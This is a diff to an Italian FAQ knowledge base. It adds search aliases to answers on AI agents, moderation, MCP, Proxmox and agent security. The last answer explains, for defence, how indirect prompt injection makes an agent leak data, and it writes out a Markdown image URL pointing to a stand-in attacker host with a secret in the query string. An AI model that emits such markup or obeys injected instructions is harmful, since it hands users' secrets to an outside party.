@@ -1102,7 +1102,8 @@
         "ai agent",
         "agente autonomo",
         "differenza chatbot agente",
-        "agente"
+        "agente",
+        "differisce da un chatbot"
       ],
       "answers": [
         "Un chatbot risponde; un **agente** agisce. La differenza tecnica: l'agente è un LLM in un **ciclo** – osserva, decide, usa uno strumento ([function calling](q/cos-e-il-function-calling/)), legge il risultato, decide ancora – finché l'obiettivo non è raggiunto. Scrive file, esegue comandi, naviga, interroga API.\n\nCon l'autonomia arrivano i rischi: un agente che esegue comandi è un utente privilegiato che si può ingannare ([prompt injection](q/cos-e-la-prompt-injection/)). Le difese sono architetturali: **permessi minimi**, sandbox, approvazione umana per le azioni irreversibili (human-in-the-loop – così fa il gate Telegram di [proxxx](https://github.com/fabriziosalmi/proxxx) prima di toccare un cluster), e strumenti esposti in modo tipizzato e limitato via [MCP](q/cos-e-mcp-model-context-protocol/) invece di \"eccoti la shell\".",
@@ -3598,7 +3599,8 @@
         "sse",
         "effetto macchina da scrivere",
         "risposta progressiva",
-        "ttft"
+        "ttft",
+        "streaming delle risposte"
       ],
       "answers": [
         "Lo **streaming** mostra la risposta man mano che i token vengono generati, invece di aspettare la fine: la latenza *totale* non cambia, ma quella **percepita** crolla – il primo token arriva in decimi di secondo (TTFT, time to first token) e l'utente legge mentre il modello scrive. Per le interfacce chat è irrinunciabile: dieci secondi di spinner sono un'eternità, dieci secondi di testo che scorre sono normali.\n\nTecnica: le API lo espongono via **SSE** (server-sent events) – eventi con frammenti di testo da concatenare; i tool call e i metadati arrivano come eventi tipizzati. Le complicazioni pratiche: il markdown parziale da renderizzare senza sfarfallio, l'interruzione pulita, gli errori a metà flusso.\n\nConfessione a tema: l'effetto macchina da scrivere di [questo sito](q/cos-e-fabgpt-come-funziona/) è *finto streaming* – le risposte esistono già intere. Il che, a pensarci, è uno streaming con TTFT perfetto e zero costo di inferenza."
@@ -3738,7 +3740,8 @@
         "contenuti vietati",
         "moderation api",
         "classificatore contenuti",
-        "filtrare input utenti"
+        "filtrare input utenti",
+        "moderazione automatica dei contenuti"
       ],
       "answers": [
         "La **moderazione automatica** classifica testi (o immagini) rispetto a categorie di rischio – violenza, odio, sessuale, autolesionismo – e decide: passa, blocca, o segnala a un umano. Nelle applicazioni LLM serve in **due direzioni**: sull'input degli utenti (per non far processare al sistema ciò che non deve) e sull'output del modello (per non pubblicare ciò che non dovrebbe uscire).\n\nGli strumenti: API di moderazione dedicate (spesso gratuite a corredo delle API principali), modelli aperti specializzati (famiglia Llama Guard), o classificatori addestrati sulle *tue* categorie – perché ogni piattaforma ha confini suoi. Le lezioni apprese sul campo: le soglie vanno tarate sui dati reali (il falso positivo che censura una discussione medica è un danno anche lui), l'italiano e i contesti ironici sono terreno fragile, e la moderazione è **un** [guardrail](q/cosa-sono-i-guardrail-llm/), non il sistema di sicurezza intero."
@@ -4281,7 +4284,8 @@
         "fastmcp",
         "mio server mcp",
         "esporre tool",
-        "scrivere server mcp"
+        "scrivere server mcp",
+        "costruisce un server mcp"
       ],
       "answers": [
         "Il Model Context Protocol (MCP) standardizza la connessione tra agenti AI e strumenti locali (filesystem, database, API).\n\nSetup rapido per sviluppare o eseguire server MCP:\n\n- **Python con uvx (immediato senza installazione globale)**:\n  ```bash\n  # Test immediato di un server SQLite o Filesystem\n  uvx mcp-server-sqlite --db-path ./database.sqlite\n  ```\n- **Node.js / TypeScript**:\n  ```bash\n  npx -y @modelcontextprotocol/server-filesystem /path/to/allowed/folder\n  ```\n- **Integrazione in config JSON (`claude_desktop_config.json` o agent runner)**:\n  ```json\n  {\n    \"mcpServers\": {\n      \"sqlite\": {\n        \"command\": \"uvx\",\n        \"args\": [\"mcp-server-sqlite\", \"--db-path\", \"/var/data/app.db\"]\n      }\n    }\n  }\n  ```\n\nPer la sicurezza in produzione, vincola i percorsi e convalida i parametri tramite gateway rigidi come [proxxx](q/cos-e-proxxx-cockpit-terminale-proxmox/)."
@@ -4828,7 +4832,8 @@
         "it mode",
         "nas dentro proxmox",
         "virtualizzare nas",
-        "truenas vm"
+        "truenas vm",
+        "truenas dentro proxmox"
       ],
       "answers": [
         "Si può fare bene, a **una condizione non negoziabile**: TrueNAS deve vedere i **dischi veri**, attraverso il passthrough di un intero controller **HBA in IT mode** (un LSI 9207/9300 da poche decine di euro) – parente del [passthrough GPU](q/passthrough-gpu-proxmox/), con IOMMU e vfio. ZFS vuole parlare con i dischi senza intermediari: TrueNAS sopra dischi *virtuali* è ZFS sopra ZFS con SMART invisibile – la ricetta del dolore silenzioso.\n\nCon l'HBA passato, la VM TrueNAS è un NAS legittimo: 8+ GB di RAM prenotati (niente ballooning), CPU `host`, e i servizi di condivisione che [tornano a Proxmox via NFS/SMB](q/montare-nfs-smb-proxmox/).\n\nIl contro strutturale: hai creato una **dipendenza circolare** – se la VM NAS ospita dischi di altre VM, l'avvio del cluster dipende da lei ([e il quorum ringrazia](q/nodo-x-rossa-quorum-perso/)). L'alternativa da considerare seriamente: **niente TrueNAS** – [ZFS nativo di Proxmox](q/perche-usare-zfs-su-proxmox/) più un container leggero per SMB fa lo stesso mestiere con un livello in meno. TrueNAS vince quando vuoi la sua UI, i suoi snapshot gestiti e le sue app – o quando il NAS deve sopravvivere concettualmente all'hypervisor."
@@ -4904,7 +4909,8 @@
         "hotplug automatico",
         "install.sh",
         "systemd autoscale",
-        "scaling vm config"
+        "scaling vm config",
+        "installa e configura vm autoscale"
       ],
       "answers": [
         "La messa in opera di [VM Autoscale](https://github.com/fabriziosalmi/proxmox-vm-autoscale) in quattro passi:\n\n- **installa** con lo script ufficiale: `bash <(curl -s https://raw.githubusercontent.com/fabriziosalmi/proxmox-vm-autoscale/main/install.sh)` – clona in `/usr/local/bin/vm_autoscale`, installa le dipendenze e registra la **unit systemd** (abilitata ma non avviata: parti tu con `systemctl start vm_autoscale.service` quando la configurazione è pronta)\n- **configura** il YAML: gli host Proxmox da governare (connessione **SSH** con chiave, [mai password nel file](q/come-gestire-i-secrets/)), le VM incluse e le **soglie** di CPU e RAM con minimi e massimi per VM – i limiti sono la tua rete di sicurezza\n- **prerequisiti a caldo**: lo scaling live vuole **NUMA e hotplug** attivi sulle VM – di default ci pensa lui (`auto_configure_hotplug`), ma ricorda [il limite fisico](q/autoscaling-vm-proxmox/): i cambi di core count si completano al riavvio della VM\n- attiva le **notifiche** (Gotify o SMTP) e, se fai hosting, il **billing CSV** che traccia i consumi per la fatturazione\n\nPoi lascia i log a raccontare: qualche giorno di osservazione, un giro di taratura delle soglie, e [le risorse seguono il carico](q/autoscaling-vm-lxc-proxmox/) invece di restare inchiodate alla stima del giorno uno."
@@ -6662,7 +6668,8 @@
         "ingannare classificatore",
         "adversarial examples",
         "data poisoning",
-        "model evasion"
+        "model evasion",
+        "attacchi avversariali al machine learning"
       ],
       "answers": [
         "Gli **attacchi avversariali** sfruttano il fatto che i modelli ML apprendono correlazioni statistiche, non comprensione: una **perturbazione minuscola e mirata** – impercettibile a un umano – può ribaltare la classificazione. L'adesivo sul cartello di stop che l'auto legge come limite di velocità, il pixel-noise che fa vedere \"gibbone\" dove c'è un panda, il malware ritoccato per sembrare benigno all'antivirus ML.\n\nLe famiglie principali:\n\n- **evasion** (a inferenza): input costruito per ingannare il modello *in produzione* – aggira i classificatori di sicurezza, i filtri di [moderazione](q/moderazione-automatica-dei-contenuti/), i rilevatori di spam\n- **poisoning** (in addestramento): contaminare i dati di training perché il modello impari la cosa sbagliata o una backdoor\n- **model inversion / extraction**: ricostruire dati di training o rubare il modello dalle sue risposte\n\nCosa cambia rispetto alla sicurezza classica: qui **non c'è patch definitiva** – è una proprietà dei modelli, non un bug. Le difese sono probabilistiche (adversarial training, input sanitization, ensemble, rilevamento di anomalie) e a strati. È il cugino ML della [prompt injection](q/cos-e-la-prompt-injection/) sugli LLM: dove il sistema \"decide\" statisticamente, l'input ostile è una superficie d'attacco permanente da presidiare, non da chiudere una volta per tutte."
@@ -8812,7 +8819,8 @@
         "furto dati agente",
         "esfiltra dati un agente",
         "agente via markdown",
-        "esfiltrazione dati tag img markdown rendering chat"
+        "esfiltrazione dati tag img markdown rendering chat",
+        "esfiltrano dati"
       ],
       "answers": [
         "Un agente compromesso via [indirect prompt injection](q/direct-e-indirect-prompt-injection/) deve poi *far uscire* i dati che ruba – e le vie sono più subdole di una connessione di rete evidente. I canali laterali documentati:\n\n- **rendering Markdown / immagini**: l'attaccante induce l'agente a generare un'immagine Markdown `![](https://server-attaccante.com/leak?dati=SEGRETO)` – quando l'interfaccia **renderizza** l'immagine, il browser della vittima fa la richiesta a quell'URL, **esfiltrando i dati nella query string**. La vittima vede solo un'immagine rotta; l'attaccante ha ricevuto il segreto. È uno degli attacchi più eleganti e ha colpito assistenti reali\n- **link cliccabili** con dati codificati nell'URL, che l'utente clicca inconsapevolmente\n- **chiamate a tool** legittimi piegate all'esfiltrazione (un tool che \"cerca sul web\" usato per spedire dati nella query)\n\nLe difese, a livello di prodotto e di architettura:\n\n- **sanitizzare l'output**: non renderizzare immagini/link verso domini arbitrari, allowlist dei domini, disabilitare il caricamento automatico di risorse esterne nelle risposte\n- **egress control** sui tool dell'agente ([niente chiamate verso domini non fidati](q/secure-web-gateway-self-hosted/))\n- **[permessi minimi](q/come-si-limita-un-agente-ai/)**: l'agente non deve avere accesso *sia* ai dati sensibili *sia* alla capacità di comunicare con l'esterno senza controlli\n\nÈ un promemoria che la sicurezza degli agenti non finisce al prompt: [ciò che l'agente legge](q/sicurezza-del-rag-e-dei-vector-database/) può ordinargli di agire, e [come il suo output viene renderizzato](q/firewall-semantici-e-guardrail-runtime/) può essere il canale di fuga. Superficie nuova, principi vecchi: valida gli input, controlla gli output, minimizza i privilegi."
